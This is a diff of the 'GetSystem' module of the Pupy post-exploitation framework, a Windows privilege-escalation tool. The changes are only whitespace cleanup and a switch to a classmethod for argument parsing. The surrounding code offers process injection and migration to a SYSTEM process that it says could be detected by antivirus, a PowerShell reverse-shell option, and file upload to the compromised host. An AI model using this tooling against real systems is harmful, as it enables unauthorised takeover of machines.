@@ -11,17 +11,18 @@ __class_name__="GetSystem"
 
 @config(compat="windows", category="privesc")
 class GetSystem(PupyModule):
-    
+
     """ try to get NT AUTHORITY SYSTEM privileges """
-    
+
     dependencies=["pupwinutils.security"]
-    
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="getsystem", description=self.__doc__)
-        self.arg_parser.add_argument("--prog", default="cmd.exe", help="Change the default process to create/inject into")
-        self.arg_parser.add_argument('-m', dest='migrate', action='store_true', default=True, help="Used by default: migrate to the system process (could be detected by AV)")
-        self.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
-        self.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help="Use powershell to automatically get a reverse shell")
+
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="getsystem", description=cls.__doc__)
+        cls.arg_parser.add_argument("--prog", default="cmd.exe", help="Change the default process to create/inject into")
+        cls.arg_parser.add_argument('-m', dest='migrate', action='store_true', default=True, help="Used by default: migrate to the system process (could be detected by AV)")
+        cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
+        cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help="Use powershell to automatically get a reverse shell")
 
     def run(self, args):
 
@@ -37,7 +38,7 @@ class GetSystem(PupyModule):
                 return
 
             cmd = self.client.desc['exec_path']
-        
+
         # use powerhell to get a reverse shell
         elif args.powershell:
             ros         = self.client.conn.modules['os']
@@ -63,11 +64,11 @@ class GetSystem(PupyModule):
 
             self.info("Uploading file in %s" % remotefile)
             upload(self.client.conn, local_file, remotefile)
-        
-        # migrate 
+
+        # migrate
         else:
             cmd     = args.prog
-        
+
         with redirected_stdo(self):
             proc_pid = self.client.conn.modules["pupwinutils.security"].getsystem(prog=cmd)
 
